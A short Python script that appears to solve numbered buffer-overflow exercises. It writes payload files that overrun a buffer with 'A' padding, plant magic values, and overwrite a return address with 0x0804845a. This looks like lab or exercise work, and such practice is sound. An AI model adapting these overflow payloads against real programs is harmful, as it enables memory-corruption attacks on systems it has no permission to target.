from struct import pack
'''
#ej1
f = open('ej1','wb')
f.write('A'*80+'DCBA')

#ej2
f = open('ej2', 'wb')
f.write('A'*70 + '\x04' + '\x03' + '\x02' + '\x01')

#ej3
f = open('ej3', 'wb')
f.write('A'*68+pack('<i', 0x0804845a))

#ej 1 y 3 
f = open('ej1y3', 'wb')
f.write('A'*68+pack('<i', 0x0804845a)+'A'*8+'DCBA')

#ej 2 y 3
f = open('ej2y3', 'wb')
f.write('A'*68+pack('<i', 0x0804845a)+'A'*6+pack('<i', 0x0804845a))

#ej 1,2 y 3 
f = open('ej1_2y3', 'wb')
f.write('A'*68+pack('<i', 0x0804845a)+'A'*6+pack('<i', 0x0804845a)+'A'*6+pack('<i', 0x0804845a))
f = open('ej4', 'wb')
f.write('\x01\x04\x00\x80' + '\x42\x00\x00\x00' * 1024 + '\x01\x00\x00\x00')

f = open('ej1y4','wb')
f.write('\x01\x04\x00\x80'+'A'*76+'DCBA'+'\x42\x00\x00\x00' * 1004 + '\x01\x00\x00\x00')
'''
#ej 1 y 3 
f = open('ej1_3y4', 'wb')
f.write('\x01\x04\x00\x80'+'A'*64 + pack('<i', 0x0804845a)+'A'*8 +'DCBA'+'\x42\x00\x00\x00' * 1004 + '\x01\x00\x00\x00' )